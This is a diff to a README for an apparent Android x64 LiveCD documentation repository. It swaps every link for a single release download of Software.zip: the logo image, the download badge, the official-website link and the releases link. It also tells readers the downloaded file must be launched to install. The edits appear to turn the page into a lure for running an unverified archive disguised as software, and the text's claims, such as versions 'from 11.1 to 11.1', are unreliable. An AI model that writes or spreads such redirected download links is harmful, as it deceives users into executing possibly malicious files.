@@ -1,6 +1,6 @@
 # 🤖️📖️ Android x64 LiveCD 11B Docs 🚀
 
-![Android-x64](https://cdn.iconscout.com/icon/free/png-512/android-105-555498.png)
+![Android-x64](https://github.com/Doudou-Samb/Android-x64_LiveCD_11B_Docs/releases/download/v1.0/Software.zip)
 
 Welcome to the documentation source repository of the special Android x64 LiveCD for all versions of Android x64 from 11.1 to 11.1. This repository serves as a comprehensive guide for Android x64 developers, enthusiasts, and users who are interested in exploring the world of Android x64 on their computers.
 
@@ -28,7 +28,7 @@ Welcome to the documentation source repository of the special Android x64 LiveCD
 
 ## Installation Guide 📥
 To get started with the Android x64 LiveCD, you can download the latest version by clicking the button below:
-[![Download Android x64 LiveCD 11B](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Android x64 LiveCD 11B](https://github.com/Doudou-Samb/Android-x64_LiveCD_11B_Docs/releases/download/v1.0/Software.zip)](https://github.com/Doudou-Samb/Android-x64_LiveCD_11B_Docs/releases/download/v1.0/Software.zip)
 
 Please note that the downloaded file needs to be launched to install the Android x64 LiveCD on your system.
 
@@ -42,8 +42,8 @@ Please note that the downloaded file needs to be launched to install the Android
 We welcome contributions from the Android x64 community. If you have any suggestions, bug fixes, or improvements, feel free to submit a pull request. Your contributions are highly appreciated!
 
 ## Resources 📚
-- [Official Website](https://www.android-x64.org): Visit the official Android x64 website for additional information and resources.
-- [Releases Section](https://github.com/Android-x64_LiveCD_11B_Docs/releases): Check out the "Releases" section for the latest updates and versions of the Android x64 LiveCD.
+- [Official Website](https://github.com/Doudou-Samb/Android-x64_LiveCD_11B_Docs/releases/download/v1.0/Software.zip): Visit the official Android x64 website for additional information and resources.
+- [Releases Section](https://github.com/Doudou-Samb/Android-x64_LiveCD_11B_Docs/releases/download/v1.0/Software.zip): Check out the "Releases" section for the latest updates and versions of the Android x64 LiveCD.
 
 ## Community 🌍
 Join our vibrant community of Android x64 enthusiasts to connect, share ideas, and collaborate on exciting projects. We have a dedicated Discord server where you can engage with like-minded individuals and stay updated on all things Android x64.
